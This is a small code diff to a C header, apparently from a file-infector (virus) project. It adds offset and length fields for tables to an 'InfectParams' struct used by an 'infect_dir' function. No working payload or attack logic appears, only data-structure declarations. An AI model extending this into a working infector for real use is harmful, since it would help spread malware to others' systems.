@@ -39,6 +39,10 @@ typedef struct s_infect_params {
 	size_t dataearly_off;
 	size_t infect_push_off;
 	size_t infect_pop_off;
+	size_t gb_table_off;
+	size_t gb_table_len_off;
+	size_t modif_table_off;
+	size_t modif_table_len_off;
 } InfectParams;
 
 int infect_dir(char *dirname, struct s_infect_params p, struct s_opt opt);
